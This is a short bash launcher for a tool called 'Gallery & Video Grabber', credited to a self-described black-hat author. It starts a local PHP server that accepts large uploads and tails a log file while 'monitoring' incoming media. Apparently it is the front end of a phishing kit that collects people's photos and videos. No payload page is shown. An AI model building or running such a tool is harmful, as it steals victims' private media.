#!/bin/bash
# Gallery & Video Grabber by Priyanshu Gupta

G='\e[92m' ; R='\e[91m' ; Y='\e[93m' ; C='\e[96m' ; W='\e[97m'

clear
echo -e "${G}"
echo "  ██████╗  █████╗ ██╗     ██╗     ███████╗██████╗ ██╗   ██╗"
echo " ██╔════╝ ██╔══██╗██║     ██║     ██╔════╝██╔══██╗╚██╗ ██╔╝"
echo " ██║  ███╗███████║██║     ██║     █████╗  ██████╔╝ ╚████╔╝ "
echo " ██║   ██║██╔══██║██║     ██║     ██╔══╝  ██╔══██╗  ╚██╔╝  "
echo " ╚██████╔╝██║  ██║███████╗███████╗███████╗██║  ██║   ██║   "
echo "  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   "
echo -e "                   \e[1;97m\e[0m"
echo -e "${Y} [+] Created by: Priyanshu Gupta ❤️${W}"
echo -e "${C} [+] Subscribe The Black Hat Priyanshu${W}"
echo -e "------------------------------------------------------------"

# PHP Start with custom config
killall php >/dev/null 2>&1
php -d upload_max_filesize=500M -d post_max_size=500M -S 127.0.0.1:8080 >/dev/null 2>&1 &

echo -e "${G}[+] High-Speed Server Online (Port 8080)${W}"
echo -e "${Y}[*] Link: ${C}http://127.0.0.1:8080${W}"
echo -e "${R}[!] Monitoring Media & Videos...${W}\n"

touch logs.txt
tail -f logs.txt
